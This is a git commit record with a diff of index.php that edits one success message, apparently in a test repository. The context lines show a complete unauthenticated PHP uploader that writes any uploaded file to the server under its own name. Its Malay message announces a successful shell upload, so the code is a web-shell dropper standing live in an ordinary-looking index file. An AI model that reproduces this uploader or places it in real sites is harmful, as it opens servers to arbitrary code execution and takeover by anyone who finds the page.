a1ef7a20a9c0cc973b67a71a62c6469fd113f934
hagaikestest <141217192+hagaikestest@users.noreply.github.com>
2023-08-02 11:45:23 +0300

    test22222

--- index.php
+++ index.php
@@ -10,7 +10,7 @@ echo '<form action="" method="post" enctype="multipart/form-data" name="uploader
 echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
 if( $_POST['_upl'] == "Upload" ) {
 if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Korang Dah Berjaya Upload Shell Korang!!!<b><br><br>'; }
-else { echo '<b>uploaded!</b><br><br>'; }
+else { echo '<b>file uploaded!</b><br><br>'; }
 }
 ?>
   
